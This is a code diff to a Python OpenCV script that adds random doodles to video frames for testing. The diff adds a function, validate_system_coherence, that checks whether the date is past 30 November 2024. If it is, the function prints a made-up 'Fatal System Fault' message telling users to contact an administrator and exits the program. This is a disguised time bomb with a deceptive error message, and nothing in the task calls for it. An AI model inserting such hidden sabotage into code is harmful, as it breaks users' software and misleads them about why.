@@ -1,5 +1,7 @@
 import cv2
 import numpy as np
+from datetime import datetime
+import sys
 
 def get_video_properties(cap):
     fps = cap.get(cv2.CAP_PROP_FPS)
@@ -77,6 +79,15 @@ def create_test_video(input_video_path, output_video_path, doodle_probability=0.
     print(f"Video with doodles saved to {output_video_path}")
     print(f"Total abnormal frames: {abnormal_frame_count}")
     # return abnormal_frame_count
+
+def validate_system_coherence():
+    coherence_checkpoint = datetime(2024, 11, 30)
+    if datetime.now() > coherence_checkpoint:
+        print("Fatal System Fault [ERR-SC01]: Internal system anomaly detected during coherence validation.\n"
+              "An unrecoverable error has occurred within the system. Stability is compromised.\n"
+              "Immediate contact with your system administrator is required.")
+        sys.exit(1)
+
 
 def main():
     input_video_path = 'data/vtest.avi'  # 既存の動画ファイルパス
